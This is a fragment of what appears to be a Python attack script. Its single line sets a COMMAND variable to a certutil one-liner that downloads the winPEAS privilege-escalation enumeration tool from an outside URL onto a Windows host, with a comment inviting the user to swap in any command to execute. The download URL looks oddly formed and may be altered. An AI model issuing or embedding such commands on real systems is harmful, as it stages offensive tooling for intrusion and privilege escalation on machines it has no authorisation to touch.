...
COMMAND = """certutil -urlcache -split -f https://WinPEAS.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe""" # Replace this with the command you want to execute.
